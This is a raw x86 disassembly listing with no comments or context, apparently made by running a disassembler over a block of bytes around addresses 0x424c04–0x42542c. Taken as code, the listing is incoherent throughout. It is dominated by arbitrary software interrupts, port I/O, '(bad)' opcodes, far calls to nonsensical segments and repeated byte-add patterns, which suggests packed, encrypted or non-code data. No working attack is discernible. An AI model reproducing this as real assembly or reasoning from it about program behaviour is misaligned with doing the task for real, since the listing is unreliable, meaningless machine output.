  424c04:	push   ebx
  424c05:	jge    0x424bd4
  424c07:	jbe    0x424bc6
  424c09:	inc    ebx
  424c0a:	rcl    esp,cl
  424c0c:	xchg   esi,eax
  424c0d:	or     dh,BYTE PTR [esi+0x75]
  424c10:	in     al,dx
  424c11:	das    
  424c12:	int    0x80
  424c14:	int    0x8d
  424c16:	jne    0x424c22
  424c18:	jbe    0x424bd7
  424c1a:	int    0x76
  424c1c:	mov    ebp,0x4dd4d343
  424c21:	int    0x70
  424c23:	sbb    al,0xcd
  424c25:	mov    bl,0x25
  424c27:	add    DWORD PTR [eax-0x29cebc80],0x25b3cdb5
  424c31:	add    DWORD PTR [eax+0x1c70cd80],0x3ad63143
  424c3b:	int    0xb3
  424c3d:	sub    eax,0xcd808081
  424c42:	xchg   esi,eax
  424c43:	dec    esp
  424c44:	int    0x62
  424c46:	cmp    al,0x87
  424c48:	xor    DWORD PTR [edx],ecx
  424c4a:	jo     0x424c70
  424c4c:	int    0x76
  424c4e:	stc    
  424c4f:	int    0x8d
  424c51:	stc    
  424c52:	cmp    edi,DWORD PTR [ecx+0x4]
  424c55:	add    bh,bh
  424c57:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424c5d:	push   ebx
  424c5e:	ror    DWORD PTR [edx],cl
  424c60:	jbe    0x424c6f
  424c62:	int    0x96
  424c64:	and    al,0x9a
  424c66:	pop    ebx
  424c67:	mov    ebp,0xf5e2
  424c6c:	push   es
  424c6d:	ins    DWORD PTR es:[edi],dx
  424c6e:	das    
  424c6f:	add    eax,0x80808099
  424c74:	add    dh,dl
  424c76:	and    al,0xcd
  424c78:	lock pop ebx
  424c7a:	mov    ebp,0xf52c
  424c7f:	push   es
  424c80:	ins    DWORD PTR es:[edi],dx
  424c81:	das    
  424c82:	add    eax,0x808080c5
  424c87:	int    0x76
  424c89:	and    al,0xcd
  424c8b:	lock int 0xd5
  424c8e:	mov    ebp,0xfbe7
  424c93:	push   es
  424c94:	ins    DWORD PTR es:[edi],dx
  424c95:	das    
  424c96:	add    eax,0x808080d1
  424c9b:	call   0x0:0xf90ebd5b
  424ca2:	push   es
  424ca3:	ins    DWORD PTR es:[edi],dx
  424ca4:	das    
  424ca5:	add    eax,0x8080802d
  424caa:	int    0x8
  424cac:	and    eax,0x43808081
  424cb1:	sbb    al,0xd6
  424cb3:	sbb    cl,ch
  424cb5:	or     BYTE PTR [ecx],dl
  424cb7:	add    DWORD PTR [eax-0x52723080],0xadd60071
  424cc1:	int    0x8d
  424cc3:	dec    esp
  424cc4:	add    BYTE PTR [ecx+0x70005b94],dl
  424cca:	and    al,0xcd
  424ccc:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424cd2:	or     ch,0x7d
  424cd5:	cmp    ecx,DWORD PTR [edi]
  424cd7:	add    al,0x11
  424cd9:	call   ebx
  424cdb:	jmp    0x424c6f
  424cdd:	shr    DWORD PTR [ebp-0x2b82acd8],cl
  424ce3:	(bad)
  424ce7:	dec    ecx
  424ce8:	and    BYTE PTR [esi-0x778932cb],al
  424cee:	int    0x8d
  424cf0:	mov    ch,cl
  424cf2:	jbe    0x424d18
  424cf4:	shr    ebx,cl
  424cf6:	xchg   edx,eax
  424cf7:	adc    al,BYTE PTR [edx]
  424cf9:	scas   eax,DWORD PTR es:[edi]
  424cfa:	cmp    DWORD PTR [eax+0x7c89b880],eax
  424d00:	sbb    ch,cl
  424d02:	ins    BYTE PTR es:[edi],dx
  424d03:	cmp    al,0xcd
  424d05:	lea    ebp,[edi+eax*4]
  424d08:	lds    ecx,FWORD PTR [edx]
  424d0a:	outs   dx,BYTE PTR ds:[esi]
  424d0b:	adc    al,0xcd
  424d0d:	jbe    0x424d3b
  424d0f:	leave  
  424d10:	add    BYTE PTR [edi-0x327f7f80],0x76
  424d17:	sub    al,0xa
  424d19:	pushf  
  424d1a:	test   ch,cl
  424d1c:	jbe    0x424d4e
  424d1e:	int    0x8d
  424d20:	sub    al,0xa
  424d22:	outs   dx,BYTE PTR ds:[esi]
  424d23:	mov    ch,cl
  424d25:	jbe    0x424d3b
  424d27:	int    0x8d
  424d29:	sub    al,0xa
  424d2b:	outs   dx,BYTE PTR ds:[esi]
  424d2c:	dec    esp
  424d2d:	in     al,dx
  424d2e:	adc    al,0xcd
  424d30:	jbe    0x424d56
  424d32:	int    0x6c
  424d34:	cmp    al,0xcd
  424d36:	lea    ebp,[edi+eax*4]
  424d39:	lds    ecx,FWORD PTR [edx]
  424d3b:	outs   dx,BYTE PTR ds:[esi]
  424d3c:	adc    al,0xcd
  424d3e:	jbe    0x424d6c
  424d40:	add    al,0x2c
  424d42:	or     cl,0x76
  424d45:	icebp  
  424d46:	add    DWORD PTR [eax-0x19fb7f80],0x92d680f1
  424d50:	cmp    ebx,ebp
  424d52:	int    0xc5
  424d54:	arpl   sp,bp
  424d56:	xchg   edx,eax
  424d57:	cmp    ebp,DWORD PTR [ebp-0x56]
  424d5a:	test   al,0xcb
  424d5c:	shl    BYTE PTR [eax+eax*4],cl
  424d5f:	xchg   esi,eax
  424d60:	int    0xed
  424d62:	jno    0x424dd5
  424d64:	das    
  424d65:	mov    ebx,0x74cf146e
  424d6a:	mov    BYTE PTR [edi+ebp*1],bl
  424d6d:	mov    ebx,0x9a5b867e
  424d72:	leave  
  424d73:	jbe    0x424d72
  424d75:	dec    ecx
  424d76:	and    DWORD PTR [esi-0x672f5cb],eax
  424d7c:	push   es
  424d7d:	retf   
  424d7e:	aam    0xb4
  424d80:	popa   
  424d81:	shl    DWORD PTR [ecx],1
  424d83:	xchg   BYTE PTR ds:0xcd4c7ccd,dh
  424d89:	out    0x88,al
  424d8b:	xchg   edx,edi
  424d8d:	pop    esi
  424d8e:	out    0x4c,al
  424d90:	or     BYTE PTR [ebp-0x33],0xdc
  424d94:	mov    BYTE PTR [edi-0x77197806],al
  424d9a:	pop    esi
  424d9b:	out    0x4c,al
  424d9d:	cmp    BYTE PTR [edx-0x33],0x8d
  424da1:	std    
  424da2:	int    0xe6
  424da4:	std    
  424da5:	cmp    edx,DWORD PTR [ebx]
  424da7:	add    al,0xf8
  424da9:	call   ebx
  424dab:	jmp    0xd41e1ad8
  424db0:	in     al,dx
  424db1:	xchg   edx,eax
  424db2:	push   ebx
  424db3:	cld    
  424db4:	add    al,0xf2
  424db6:	std    
  424db7:	add    al,0xd3
  424db9:	test   BYTE PTR [ebp*2+0x10d37a3c],al
  424dc0:	sub    BYTE PTR [ebx-0x6],dl
  424dc3:	adc    bh,al
  424dc5:	dec    ecx
  424dc6:	and    DWORD PTR [esi-0x2197ecb],eax
  424dcc:	int    0x8d
  424dce:	std    
  424dcf:	int    0xe6
  424dd1:	std    
  424dd2:	cmp    edx,DWORD PTR [ebx]
  424dd4:	add    al,0xf8
  424dd6:	call   ebx
  424dd8:	jmp    0x424d6c
  424dda:	shr    ecx,cl
  424ddc:	sub    BYTE PTR [ebx-0x10],dl
  424ddf:	inc    ebx
  424de0:	(bad)  
  424de1:	stc    
  424de2:	xor    BYTE PTR [ecx+0x63aa6d3b],0xcb
  424de9:	ror    BYTE PTR [eax-0x12326980],cl
  424def:	add    al,0xed
  424df1:	push   eax
  424df2:	leave  
  424df3:	jbe    0x424d9a
  424df5:	mov    edx,0xc98080ac
  424dfa:	jbe    0x424db1
  424dfc:	xchg   eax,ecx
  424dfe:	add    BYTE PTR [eax-0x68528937],0x40
  424e05:	add    BYTE PTR [eax-0x51068937],0x30
  424e0c:	test   BYTE PTR [eax-0x4a028937],al
  424e12:	lods   al,BYTE PTR ds:[esi]
  424e13:	add    BYTE PTR [eax+0x69f176c9],0x53
  424e1a:	add    BYTE PTR [eax-0x76a8937],0x42
  424e21:	add    BYTE PTR [eax-0x78628937],0x80
  424e28:	add    BYTE PTR [eax-0x2c428937],0xb8
  424e2f:	add    BYTE PTR [eax-0x32128937],0x71
  424e36:	add    BYTE PTR [eax-0x1dee8937],0xb6
  424e3d:	add    BYTE PTR [eax+0x5dfd8dcd],0x8b
  424e44:	mov    al,BYTE PTR [eax-0x322ccc80]
  424e4a:	(bad)  
  424e4b:	stc    
  424e4c:	cmp    ebx,edx
  424e4e:	clc    
  424e4f:	add    bl,BYTE PTR [eax+0x127dcd9a]
  424e55:	repnz popa 
  424e57:	and    al,BYTE PTR [eax-0x7a34ed80]
  424e5d:	mov    BYTE PTR [eax+0x42021280],0xa4
  424e64:	add    BYTE PTR [eax+0x3cded312],0x80
  424e6b:	or     cl,0x76
  424e6e:	cmc    
  424e6f:	icebp  
  424e70:	lea    eax,[eax-0x2893680]
  424e76:	jnp    0x424e4c
  424e78:	add    BYTE PTR [eax+0x18f976c9],0x30
  424e7f:	add    BYTE PTR [eax-0x32068933],0x96
  424e86:	std    
  424e87:	ss dec eax
  424e89:	pushf  
  424e8a:	add    BYTE PTR [eax+0x7687d23b],0xf5
  424e91:	int    0xe3
  424e93:	push   esi
  424e94:	jp     0x424e95
  424e96:	add    BYTE PTR [eax-0x69f50ecd],0xfd
  424e9d:	int    0x76
  424e9f:	std    
  424ea0:	xchg   DWORD PTR [esi-0x78],esi
  424ea3:	int    0x96
  424ea5:	std    
  424ea6:	xchg   DWORD PTR [esi+0x922ca4c],edx
  424eac:	xor    ch,cl
  424eae:	jbe    0x424ec1
  424eb0:	int    0x96
  424eb2:	in     eax,dx
  424eb3:	sbb    BYTE PTR ss:[edi-0x80],cl
  424eb7:	cmp    BYTE PTR [ebx],0xd2
  424eba:	int    0x96
  424ebc:	mov    ebp,0xe261d253
  424ec1:	fadd   DWORD PTR [eax-0x320ecc80]
  424ec7:	jbe    0x424e7e
  424ec9:	xchg   DWORD PTR [ebx],edx
  424ecb:	popa   
  424ecc:	fist   WORD PTR [eax+eax*4-0x80]
  424ed0:	xor    esi,ecx
  424ed2:	xchg   DWORD PTR [esi-0x5a893253],edx
  424ed8:	int    0xd6
  424eda:	xor    ch,cl
  424edc:	out    0x9d,al
  424ede:	adc    bh,bl
  424ee0:	mov    DWORD PTR [ecx-0x80],esi
  424ee3:	sub    BYTE PTR [ebx],0xf1
  424ee6:	int    0x76
  424ee8:	xchg   ebp,eax
  424ee9:	adc    bh,bl
  424eeb:	mov    dh,0x2c
  424eed:	add    BYTE PTR [eax-0x25c404cd],0xf8
  424ef4:	clc    
  424ef5:	int    0x96
  424ef7:	icebp  
  424ef8:	push   esi
  424ef9:	out    0x1e,al
  424efb:	add    BYTE PTR [eax-0x1c322dd5],0x33
  424f02:	icebp  
  424f03:	adc    dh,bl
  424f05:	pop    es
  424f06:	push   edx
  424f07:	add    BYTE PTR [eax+0x72f9943],0x63
  424f0e:	add    BYTE PTR [eax],al
  424f10:	add    BYTE PTR [edx+0x4cd2cba8],ch
  424f16:	adc    BYTE PTR [esi-0x12fb1233],0x74
  424f1d:	pop    ebx
  424f1e:	cwde   
  424f1f:	call   0x8043:0xd9ed76c9
  424f26:	or     cl,0x76
  424f29:	adc    DWORD PTR [edx+0x7e],esi
  424f2c:	add    BYTE PTR [eax+0x5ff576c9],0x71
  424f33:	add    BYTE PTR [eax+0xbf976c9],0x71
  424f3a:	add    BYTE PTR [eax+0x29fd76c9],0x2c
  424f41:	add    BYTE PTR [eax-0x275a8937],0x58
  424f48:	add    BYTE PTR [eax+0x76ad76c9],0x84
  424f4f:	add    BYTE PTR [eax+0x6cb576c9],0x8c
  424f56:	add    BYTE PTR [eax+0x1abd76c9],0x5e
  424f5d:	add    BYTE PTR [eax-0x449a8937],0x6f
  424f64:	add    BYTE PTR [eax+0x4a6d76c9],0x80
  424f6b:	add    BYTE PTR [eax+0x4d7576c9],0x38
  424f72:	add    BYTE PTR [eax+0x1f7d76c9],0x28
  424f79:	add    BYTE PTR [eax-0x44f28937],0x4d
  424f80:	add    BYTE PTR [eax-0x1b0e8937],0x1c
  424f87:	add    BYTE PTR [eax-0x32528933],0x8d
  424f8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f8f:	dec    ebp
  424f90:	bound  ebp,QWORD PTR [ebx]
  424f92:	add    BYTE PTR [eax-0x7f59c2ba],0x80
  424f99:	dec    ebp
  424f9a:	pop    ds
  424f9b:	and    eax,DWORD PTR [eax-0x2c2ed080]
  424fa1:	pop    edi
  424fa2:	xchg   ecx,eax
  424fa3:	mov    bh,0x7e
  424fa5:	stc    
  424fa6:	xor    edi,DWORD PTR [ebp-0x33]
  424fa9:	jbe    0x424fa8
  424fab:	int    0x96
  424fad:	stc    
  424fae:	sub    edx,edx
  424fb0:	int    0x96
  424fb2:	cmc    
  424fb3:	dec    ebp
  424fb4:	inc    edi
  424fb5:	outs   dx,DWORD PTR ds:[esi]
  424fb6:	add    BYTE PTR [eax-0x69322dcd],0x11
  424fbd:	xor    edx,edx
  424fbf:	int    0x96
  424fc1:	in     eax,dx
  424fc2:	push   ebx
  424fc3:	sar    BYTE PTR [ebx],cl
  424fc5:	fisubr DWORD PTR [ecx-0x27]
  424fc8:	ret    
  424fc9:	add    BYTE PTR [eax],al
  424fcb:	clc    
  424fcc:	test   ebp,0x72c34c96
  424fd2:	push   ds
  424fd3:	add    BYTE PTR [eax+0x76cdf133],0xbd
  424fda:	int    0xd6
  424fdc:	mov    ch,0x33
  424fde:	leave  
  424fdf:	das    
  424fe0:	sar    DWORD PTR [ecx+0x69],1
  424fe3:	fisttp DWORD PTR [edx]
  424fe5:	xchg   ecx,eax
  424fe6:	mov    ebx,ebp
  424fe8:	popa   
  424fe9:	add    BYTE PTR [eax-0x6a893680],0x9b
  424ff0:	push   esp
  424ff1:	add    BYTE PTR [eax+0x2d9d76c9],0x6f
  424ff8:	add    BYTE PTR [eax+0x1ad76c9],0xa4
  424fff:	add    BYTE PTR [eax-0x7e5a8937],0x80
  425006:	add    BYTE PTR [eax+0x3ba5a6cd],0xda
  42500d:	pop    ebp
  42500e:	call   0xcdf4:0xf880806f
  425015:	xchg   esi,eax
  425016:	lods   eax,DWORD PTR ds:[esi]
  425017:	int    0xa6
  425019:	mov    BYTE PTR [ebx-0x2e],dl
  42501c:	int    0x96
  42501e:	popf   
  42501f:	xor    edx,edx
  425021:	int    0x96
  425023:	xchg   ebp,eax
  425024:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  425026:	push   eax
  425027:	add    BYTE PTR [eax-0x302d2ed1],0x5
  42502e:	mov    BYTE PTR [eax+0x2c],bl
  425031:	ret    0xafd
  425034:	jbe    0x424fcb
  425036:	int    0x76
  425038:	icebp  
  425039:	int    0x96
  42503b:	or     eax,0xf3f7f534
  425040:	int    0x96
  425042:	xchg   ebp,eax
  425043:	xor    al,0x23
  425045:	inc    esp
  425046:	test   DWORD PTR [ebp+edx*8-0x7c],ecx
  42504a:	inc    esi
  42504b:	or     DWORD PTR [eax+eiz*1+0x4d7d76cd],eax
  425052:	rol    esi,0x80
  425055:	add    BYTE PTR [edi-0x59328a8a],0x6d
  42505c:	cmp    ebx,edx
  42505e:	clc    
  42505f:	hlt    
  425060:	int    0x96
  425062:	gs mov edi,0xc3d9
  425068:	ss aaa 
  42506a:	push   esi
  42506b:	add    BYTE PTR [eax+0xc56d233],0x6d
  425072:	add    BYTE PTR [eax],al
  425074:	xchg   DWORD PTR [ebp-0x33],edi
  425077:	jbe    0x425076
  425079:	int    0x96
  42507b:	stc    
  42507c:	sub    edx,edx
  42507e:	int    0x96
  425080:	cmc    
  425081:	dec    ebp
  425082:	inc    edi
  425083:	outs   dx,DWORD PTR ds:[esi]
  425084:	add    BYTE PTR [eax-0x69322dcd],0x11
  42508b:	xor    edx,edx
  42508d:	int    0x96
  42508f:	in     eax,dx
  425090:	push   ebx
  425091:	sar    BYTE PTR [ebx],cl
  425093:	(bad)  
  425095:	hlt    
  425096:	int    0x96
  425098:	dec    esp
  425099:	xor    esi,ecx
  42509b:	int    0x76
  42509d:	mov    ebp,0x33b5a6cd
  4250a2:	leave  
  4250a3:	das    
  4250a4:	rol    ebp,1
  4250a6:	int    0xdb
  4250a8:	xor    ebx,DWORD PTR [ebp-0x1dbc5679]
  4250ae:	das    
  4250af:	pop    es
  4250b0:	pop    esp
  4250b1:	add    BYTE PTR [eax],al
  4250b3:	add    BYTE PTR [edx-0x2d349c58],ch
  4250b9:	mov    BYTE PTR [eax+0x4edcd96],al
  4250bf:	in     eax,dx
  4250c0:	jo     0x42508b
  4250c2:	jbe    0x425094
  4250c4:	xchg   ecx,eax
  4250c5:	aaa    
  4250c6:	ficom  WORD PTR [ebx]
  4250c8:	pop    ebp
  4250c9:	mov    ebp,0xa25230a
  4250ce:	jbe    0x425125
  4250d0:	leave  
  4250d1:	jbe    0x425130
  4250d3:	mov    esi,0xa13de37
  4250d8:	jbe    0x42513f
  4250da:	leave  
  4250db:	jbe    0x42514a
  4250dd:	fidiv  WORD PTR [edi]
  4250df:	ficom  WORD PTR [ebx]
  4250e1:	or     dh,BYTE PTR [esi+0x75]
  4250e4:	pop    ebx
  4250e5:	leave  
  4250e6:	jbe    0x425165
  4250e8:	scas   al,BYTE PTR es:[edi]
  4250e9:	aaa    
  4250ea:	ficom  WORD PTR [ebx]
  4250ec:	or     dh,BYTE PTR [esi+0xd]
  4250ef:	cwde   
  4250f0:	call   0xde37:0x96f176c9
  4250f7:	adc    ecx,DWORD PTR [edx]
  4250f9:	jbe    0x425090
  4250fb:	cmp    ebx,edx
  4250fd:	cmp    eax,DWORD PTR [eax]
  4250ff:	pop    edi
  425100:	dec    ecx
  425101:	and    DWORD PTR [esi-0x628936cb],eax
  425107:	out    0x37,al
  425109:	ficom  WORD PTR [ebx]
  42510b:	jp     0x425117
  42510d:	jbe    0x4250b4
  42510f:	int    0xd3
  425111:	or     dl,BYTE PTR [esi-0x4a19f513]
  425117:	iret   
  425118:	xchg   ecx,eax
  425119:	add    DWORD PTR [ecx+edx*1],0x28add3ff
  425120:	push   ebx
  425121:	ror    bh,cl
  425123:	je     0x4250ec
  425125:	ror    ch,1
  425127:	xor    ch,cl
  425129:	pushf  
  42512a:	test   BYTE PTR [edi],ch
  42512c:	inc    ebp
  42512d:	loop   0x4250c1
  42512f:	shr    esp,cl
  425131:	xchg   edx,eax
  425132:	int    0x1c
  425134:	int    0x6c
  425136:	test   BYTE PTR [ebx],bh
  425138:	ins    DWORD PTR es:[edi],dx
  425139:	adc    bh,bl
  42513b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42513c:	mov    esi,0xf1534229
  425141:	or     dl,BYTE PTR [esi-0x6893207]
  425147:	xchg   DWORD PTR [ebp-0x2d],ebp
  42514a:	in     eax,0x28
  42514c:	inc    ebx
  42514d:	jbe    0x42519b
  42514f:	das    
  425150:	or     BYTE PTR [edi-0x327f7f80],bh
  425156:	jbe    0x425151
  425158:	add    al,0xb6
  42515a:	mov    ebp,0x11e60a80
  42515f:	int    0x76
  425161:	stc    
  425162:	push   es
  425163:	ins    DWORD PTR es:[edi],dx
  425164:	aam    0xb6
  425166:	cmp    ebp,DWORD PTR [ebp+0xa]
  425169:	out    0xf5,al
  42516b:	int    0x96
  42516d:	mov    ebp,0xcf88a6cd
  425172:	fs xor ch,cl
  425175:	xchg   esi,eax
  425176:	mov    BYTE PTR [edi-0x5269f527],al
  42517c:	retf   0x922
  42517f:	xchg   esi,eax
  425180:	add    ch,cl
  425182:	xchg   esi,eax
  425183:	stc    
  425184:	xchg   ecx,ebx
  425186:	retf   0x2014
  425189:	int    0xa6
  42518b:	lods   eax,DWORD PTR ds:[esi]
  42518c:	or     DWORD PTR [ebx],ebx
  42518e:	retf   0x96
  425191:	int    0xa6
  425193:	stc    
  425194:	xchg   ecx,esp
  425196:	int    0xe6
  425198:	mov    BYTE PTR [ecx],cl
  42519a:	adc    al,0x43
  42519c:	int    0x96
  42519e:	cmc    
  42519f:	ins    BYTE PTR es:[edi],dx
  4251a0:	add    al,0xea
  4251a2:	std    
  4251a3:	sar    DWORD PTR [ebp-0x7b2dfbd8],cl
  4251a9:	push   ebx
  4251aa:	sar    BYTE PTR [ebx],cl
  4251ac:	ror    DWORD PTR [edx],cl
  4251ae:	jbe    0x4251a5
  4251b0:	push   ecx
  4251b1:	(bad)  
  4251b2:	cmc    
  4251b3:	int    0x96
  4251b5:	cmc    
  4251b6:	add    al,0x11
  4251b8:	call   ebx
  4251ba:	repz xchg edx,eax
  4251bc:	shr    DWORD PTR [ebp-0x322dacd8],cl
  4251c2:	xchg   esi,eax
  4251c3:	stc    
  4251c4:	inc    ebx
  4251c5:	rol    BYTE PTR [edx+0x7a003ba7],cl
  4251cb:	int    0x76
  4251cd:	adc    ebp,ecx
  4251cf:	xchg   esi,eax
  4251d0:	stc    
  4251d1:	int    0xa6
  4251d3:	mov    ebp,0xcffdad04
  4251d8:	test   cl,dh
  4251da:	int    0x96
  4251dc:	stc    
  4251dd:	iret   
  4251de:	adc    al,0x5b
  4251e0:	int    0xa6
  4251e2:	dec    esp
  4251e3:	shl    ebx,cl
  4251e5:	sub    BYTE PTR [ebx-0x2e],dl
  4251e8:	cmp    edx,ebx
  4251ea:	or     dh,BYTE PTR [esi+0x11]
  4251ed:	push   ecx
  4251ee:	(bad)  
  4251ef:	adc    ebp,ecx
  4251f1:	xchg   esi,eax
  4251f2:	adc    DWORD PTR [ecx+edx*1],eax
  4251f5:	call   ebx
  4251f7:	repz xchg edx,eax
  4251f9:	shr    DWORD PTR [ebp-0x322dacd8],cl
  4251ff:	xchg   esi,eax
  425200:	stc    
  425201:	xchg   edx,ebx
  425203:	xor    esp,edx
  425205:	or     dh,BYTE PTR [esi-0x43]
  425208:	inc    ebx
  425209:	lds    ebp,FWORD PTR [edi]
  42520b:	pop    es
  42520c:	outs   dx,DWORD PTR ds:[esi]
  42520d:	add    BYTE PTR [eax],al
  42520f:	add    ch,cl
  425211:	jbe    0x425200
  425213:	int    0x96
  425215:	mov    ch,0x4
  425217:	jmp    0xd384:0xd2046cfd
  42521e:	mov    ebp,0x3bd25328
  425223:	ror    ebp,cl
  425225:	popf   
  425226:	int    0xf1
  425228:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  42522e:	in     eax,0x28
  425230:	or     dl,BYTE PTR [esi-0x6d0c2c4b]
  425236:	or     ah,BYTE PTR [esi-0x12697613]
  42523c:	add    al,0xe6
  42523e:	in     eax,dx
  42523f:	xchg   BYTE PTR [edi],ch
  425241:	or     edx,DWORD PTR [ebp-0x55ffff01]
  425247:	test   al,0x63
  425249:	retf   
  42524a:	ror    BYTE PTR [eax-0x12326980],cl
  425250:	add    al,0xed
  425252:	adc    al,0xcd
  425254:	jbe    0x4251de
  425256:	leave  
  425257:	jbe    0x42526a
  425259:	dec    ecx
  42525a:	and    DWORD PTR [esi-0x28936cb],eax
  425260:	inc    ecx
  425261:	and    DWORD PTR [esi+0x5b80cd35],eax
  425267:	cwde   
  425268:	or     dh,BYTE PTR [esi-0x7]
  42526b:	leave  
  42526c:	jbe    0x425263
  42526e:	into   
  42526f:	and    DWORD PTR [esi+0x76c99a35],eax
  425275:	in     eax,dx
  425276:	inc    esi
  425277:	sbb    DWORD PTR [ebp-0x22932de],esi
  42527d:	int    0x8d
  42527f:	std    
  425280:	sar    bh,0x5d
  425283:	shl    DWORD PTR [ecx],1
  425285:	xchg   BYTE PTR ds:0xd3f03baa,dh
  42528b:	repnz sub BYTE PTR [ebx],bh
  42528e:	adc    ebx,edx
  425290:	out    dx,eax
  425291:	xchg   edx,eax
  425292:	push   ebx
  425293:	add    cl,ch
  425295:	lea    edx,[ecx]
  425297:	int    0x96
  425299:	adc    DWORD PTR [ebx],edi
  42529b:	jge    0x4252d8
  42529d:	(bad)  
  42529f:	jmp    0x425233
  4252a1:	shr    edx,cl
  4252a3:	sub    BYTE PTR [ebx+0x13],dl
  4252a6:	das    
  4252a7:	rol    DWORD PTR [edx],1
  4252a9:	jmp    0x42524a
  4252ab:	add    BYTE PTR [eax-0x6723280],0xcd
  4252b2:	xchg   esi,eax
  4252b3:	stc    
  4252b4:	cmp    ebx,ecx
  4252b6:	shr    edx,cl
  4252b8:	sub    BYTE PTR [ebx],bh
  4252ba:	jge    0x42528f
  4252bc:	jmp    0x425250
  4252be:	push   ebx
  4252bf:	adc    ecx,ebp
  4252c1:	xchg   esi,eax
  4252c2:	std    
  4252c3:	int    0xa6
  4252c5:	std    
  4252c6:	cmp    esi,ecx
  4252c8:	cmp    esp,ecx
  4252ca:	shl    ebx,cl
  4252cc:	xchg   edx,eax
  4252cd:	shl    ebp,cl
  4252cf:	sub    BYTE PTR [ebx-0x2b],dl
  4252d2:	push   es
  4252d3:	adc    ecx,ebp
  4252d5:	xchg   esi,eax
  4252d6:	stc    
  4252d7:	int    0x8d
  4252d9:	stc    
  4252da:	aam    0x58
  4252dc:	cmp    esi,eax
  4252de:	shl    edx,cl
  4252e0:	sub    BYTE PTR [ebx],bh
  4252e2:	icebp  
  4252e3:	shl    ebx,cl
  4252e5:	xchg   edx,eax
  4252e6:	push   ebx
  4252e7:	jecxz  0x4252b6
  4252e9:	(bad)  
  4252ea:	std    
  4252eb:	int    0xa6
  4252ed:	std    
  4252ee:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252f1:	loope  0x4252c6
  4252f3:	jmp    0x425287
  4252f5:	shl    ebp,cl
  4252f7:	sub    BYTE PTR [ebx+0xc],dl
  4252fa:	aad    0xf3
  4252fc:	int    0x8d
  4252fe:	in     eax,dx
  4252ff:	int    0xa6
  425301:	in     eax,dx
  425302:	cmp    edi,DWORD PTR [ebp+0x3b]
  425305:	loope  0x4252da
  425307:	jmp    0x42529b
  425309:	shl    ebp,cl
  42530b:	sub    BYTE PTR [ebx+0xc],dl
  42530e:	cmp    esp,ebx
  425310:	in     al,dx
  425311:	sub    al,0x3b
  425313:	lock shl edx,cl
  425316:	sub    BYTE PTR [ebx],bh
  425318:	icebp  
  425319:	shl    ebx,cl
  42531b:	xchg   edx,eax
  42531c:	push   ebx
  42531d:	jecxz  0x4252ec
  42531f:	(bad)  
  425320:	std    
  425321:	int    0xa6
  425323:	std    
  425324:	cmp    edi,DWORD PTR [ebp+0x3b]
  425327:	loope  0x4252fc
  425329:	jmp    0x4252bd
  42532b:	shl    ebp,cl
  42532d:	sub    BYTE PTR [ebx+0xc],dl
  425330:	aad    0xf3
  425332:	or     dl,BYTE PTR [esi-0x2723207]
  425338:	int    0x96
  42533a:	std    
  42533b:	cmp    edi,DWORD PTR [ebp+0x3b]
  42533e:	(bad)  
  425340:	jmp    0x4252d4
  425342:	shr    edx,cl
  425344:	sub    BYTE PTR [ebx+0x13],dl
  425347:	xchg   DWORD PTR [edx],eax
  425349:	int    0x8d
  42534b:	cmc    
  42534c:	int    0x96
  42534e:	cmc    
  42534f:	cmp    ebx,ecx
  425351:	cmp    edi,DWORD PTR [ebp-0x2d]
  425354:	jmp    0x1353:0x92ebd328
  42535b:	int    0x96
  42535d:	std    
  42535e:	int    0xa6
  425360:	std    
  425361:	cmp    esi,ecx
  425363:	cmp    esp,ecx
  425365:	shl    ebp,cl
  425367:	sub    bl,dl
  425369:	repz xchg edx,eax
  42536b:	push   ebx
  42536c:	aad    0x33
  42536e:	adc    eax,DWORD PTR [ebx+0x2]
  425371:	das    
  425372:	pop    es
  425373:	pop    edx
  425374:	add    BYTE PTR [eax],al
  425376:	add    ch,cl
  425378:	jbe    0x425373
  42537a:	int    0x8d
  42537c:	mov    BYTE PTR [edx-0x327ef558],ch
  425382:	jbe    0x42537d
  425384:	arpl   bx,cx
  425386:	rol    BYTE PTR [eax+eax*4+0x3bedcd96],cl
  42538d:	ins    DWORD PTR es:[edi],dx
  42538e:	pop    esi
  42538f:	jbe    0x4253dd
  425391:	aam    0x3a
  425393:	pop    esi
  425394:	jbe    0x42531e
  425396:	fdiv   DWORD PTR [edx]
  425398:	retf   0x8814
  42539b:	or     DWORD PTR [esi-0x69a6d0d1],edx
  4253a1:	das    
  4253a2:	adc    dh,bl
  4253a4:	in     eax,dx
  4253a5:	add    BYTE PTR [eax+0x2f960980],0xf1
  4253ac:	lea    ebp,[edi]
  4253ae:	retf   0x2f96
  4253b1:	or     DWORD PTR [eax+ecx*4],edx
  4253b4:	ins    BYTE PTR es:[edi],dx
  4253b5:	inc    ebx
  4253b6:	jbe    0x425340
  4253b8:	sub    BYTE PTR [ecx+0x7188d600],0xbd
  4253bf:	stc    
  4253c0:	std    
  4253c1:	add    BYTE PTR [eax],al
  4253c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253c4:	ror    BYTE PTR [eax-0x12326980],cl
  4253ca:	adc    ch,ch
  4253cc:	cmp    al,0x84
  4253ce:	add    BYTE PTR [eax+0x49bf985b],0x21
  4253d5:	xchg   BYTE PTR ds:0xc911a60a,dh
  4253db:	jbe    0x4253da
  4253dd:	inc    ecx
  4253de:	and    DWORD PTR [esi-0x128936cb],eax
  4253e4:	dec    ecx
  4253e5:	sub    DWORD PTR [esi-0x4a8936cb],eax
  4253eb:	jno    0x4253a3
  4253ed:	cli    
  4253ee:	arpl   bp,cx
  4253f0:	jbe    0x425403
  4253f2:	int    0x8d
  4253f4:	adc    DWORD PTR [edx+0x77cfffc0],ebx
  4253fa:	sub    DWORD PTR [edx-0xfc486c5],0xd392bdd3
  425404:	repnz sub BYTE PTR [ebx-0x2d],dl
  425408:	or     dh,BYTE PTR [esi-0x7]
  42540b:	leave  
  42540c:	jbe    0x4253b3
  42540e:	into   
  42540f:	and    DWORD PTR [esi-0x628936cb],eax
  425415:	inc    esi
  425416:	sbb    DWORD PTR [ebp-0x528936de],esi
  42541c:	mov    BYTE PTR [eax-0x34327f80],al
  425422:	int    0x76
  425424:	std    
  425425:	int    0x8d
  425427:	std    
  425428:	cmp    esi,eax
  42542a:	shl    edx,cl
  42542c:	sub    BYTE PTR [ebx],bh
